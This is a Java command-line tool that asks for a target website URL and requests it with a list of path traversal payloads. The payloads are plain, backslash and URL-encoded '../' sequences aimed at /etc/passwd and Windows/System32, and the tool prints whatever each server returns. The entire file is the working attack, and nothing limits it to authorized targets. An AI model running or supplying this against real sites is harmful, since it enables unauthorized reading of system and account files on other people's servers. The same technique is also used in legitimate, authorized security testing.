import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class PathTraversalTester {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        // Ask for the target website URL
        System.out.print("\033[0;36mEnter your target website URL: \033[0m");
        String targetUrl = scanner.nextLine();

        // Perform the Path Traversal test
        testForPathTraversal(targetUrl);
    }

    // Function to test for Path Traversal vulnerability
    private static void testForPathTraversal(String url) {
        HttpURLConnection connection = null;
        BufferedReader reader = null;

        try {
            // Create the URL object
            URL targetUrl = new URL(url);

            // Payloads to test
            String[] payloads = {
                "../../../../../etc/passwd",
                "../../../../../../../../etc/passwd",
                "../../../../../../../../Windows/System32",
                "../../../../../Windows/System32",
                "../../../etc/passwd",
                "../../../../../Windows/System32",
                "../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../Windows/System32",
                "../../../../../../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../../../../../../Windows/System32",
                "../../../..\\..\\..\\..\\..\\..\\etc\\passwd",
                "../../../..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "../../../..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
                "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
                "../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../Windows/System32",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
                "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
                "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWindows/System32",
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows/System32",
                "../../../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../../../Windows/System32",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
                "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
                "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWindows/System32",
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows/System32"
            };

            // Iterate over payloads
            for (String payload : payloads) {
                try {
                    // Create the URL with payload
                    URL payloadUrl = new URL(targetUrl, payload);

                    // Open connection
                    connection = (HttpURLConnection) payloadUrl.openConnection();
                    connection.setRequestMethod("GET");

                    // Read response content
                    reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String line;
                    StringBuilder response = new StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }

                    // Display payload and response content
                    System.out.println("\nPayload: " + payload);
                    System.out.println("Response Content:\n" + response.toString());
                } catch (IOException e) {
                    // Handle connection or URL errors
                    System.out.println("\nPayload: " + payload);
                    System.out.println("Error: " + e.getMessage());
                } finally {
                    // Close reader and connection
                    if (reader != null) {
                        reader.close();
                    }
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        } catch (IOException e) {
            // Error handling for URL creation
            System.out.println("Error: " + e.getMessage());
        }
    }
}
